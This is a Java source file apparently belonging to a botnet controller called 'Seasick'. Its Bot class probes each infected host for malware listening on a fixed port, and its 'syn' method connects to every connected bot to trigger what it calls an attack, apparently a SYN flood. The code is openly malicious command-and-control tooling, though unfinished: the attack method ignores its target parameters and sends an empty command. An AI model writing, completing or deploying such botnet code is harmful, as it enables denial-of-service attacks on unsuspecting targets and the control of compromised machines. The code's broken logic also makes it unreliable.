package uk.tsis.seasick.obj;

import uk.tsis.seasick.Seasick;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;

public class Bot {

    private String host;

    public Bot(String host) {
        this.host = host;
    }

    @Deprecated
    public boolean isMalwareRunning(){
        try{
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(host, Seasick.MALWARE_PORT), 10000);
            return true;
        }catch (IOException e){
            return false;
        }
    }

    public String getHost(){
        return host;
    }

    @SuppressWarnings("All")
    public static void syn(String host, int port, int threads){
        for (Bot bot : Seasick.connectedBots) {
            try {
                //if (bot.isMalwareRunning()) {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(bot.getHost(), Seasick.MALWARE_PORT), 10000);
                    PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
                    writer.write("");
                    writer.flush();
                    writer.close();
                    socket.close();
                    System.out.println("Executed on: " + bot.getHost());
              //  }
            }catch (IOException e){

            }
        }
        System.out.println("Executed Attack...");
    }


}
